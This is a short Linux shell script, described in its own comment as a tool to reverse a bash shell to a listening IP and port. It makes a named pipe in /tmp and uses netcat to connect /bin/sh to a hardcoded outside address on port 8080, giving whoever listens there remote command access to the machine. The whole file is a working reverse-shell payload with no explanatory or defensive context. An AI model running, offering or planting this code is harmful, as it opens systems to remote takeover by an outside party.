#!/bin/sh
# This is a Linux shell script to reverse bash shell to a specific listenning IP and port. 

r_num=$(date +%s);
backpipe="backpipe""$r_num";

mknod /tmp/$backpipe p;
/bin/sh 0</tmp/$backpipe | nc 133.130.114.161 8080 1>/tmp/$backpipe;